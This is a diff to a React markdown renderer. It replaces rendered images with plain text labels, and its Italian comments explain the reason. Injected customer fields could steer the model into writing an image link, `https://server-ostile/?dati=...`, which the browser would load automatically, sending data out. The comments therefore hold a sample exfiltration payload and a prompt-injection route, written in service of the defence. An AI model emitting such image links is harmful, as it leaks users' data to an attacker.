@@ -27,6 +27,33 @@ const components: Components = {
       {children}
     </a>
   ),
+  // ── SICUREZZA: nessuna immagine scritta dal modello viene mai caricata ──
+  // Il testo analizzato contiene campi liberi del cliente (nome cliente nello
+  // scadenzario, fornitore nelle spese ricorrenti, categorie importate da CSV):
+  // chi scrive quei campi può provare a far emettere al modello un
+  // `![x](https://server-ostile/?dati=...)`. Con l'`img` predefinito il browser
+  // dell'imprenditore andrebbe a prendere quell'indirizzo DA SOLO, senza che
+  // nessuno clicchi, spedendo fuori quello che c'è nella URL.
+  //
+  // Qui `img` non produce NESSUN tag che carichi una risorsa: rende solo un
+  // <span> di testo. Non esiste `src`, quindi non parte nessuna richiesta di
+  // rete — non è un filtro sull'indirizzo (che si può aggirare), è l'assenza
+  // dell'elemento che sa scaricare.
+  //
+  // `alt` è testo scritto dal modello: React lo inserisce come nodo di testo e
+  // ne fa l'escape, quindi non può reintrodurre markup.
+  //
+  // PERCHÉ SOLO `img` E NON ANCHE video/audio/iframe/embed/object: quei tag non
+  // sono raggiungibili da qui. Senza il plugin rehype-raw (non installato, vedi
+  // <ReactMarkdown> in fondo al file) l'HTML grezzo scritto dal modello viene
+  // SCARTATO — mdast-util-to-hast/lib/handlers/html.js restituisce `undefined`
+  // quando `allowDangerousHtml` è falso. Il markdown puro + GFM sa creare un
+  // solo elemento capace di caricare una risorsa esterna, ed è l'immagine.
+  img: ({ alt }) => (
+    <span className="my-2 inline-block rounded border border-border bg-muted px-2 py-1 text-xs text-fg-2">
+      {alt ? `[immagine rimossa: ${alt}]` : '[immagine rimossa]'}
+    </span>
+  ),
   hr: () => <hr className="my-5 border-border" />,
   blockquote: ({ children }) => (
     <blockquote className="my-3 border-l-2 border-sage-500/50 pl-4 text-sm italic text-fg-2">{children}</blockquote>
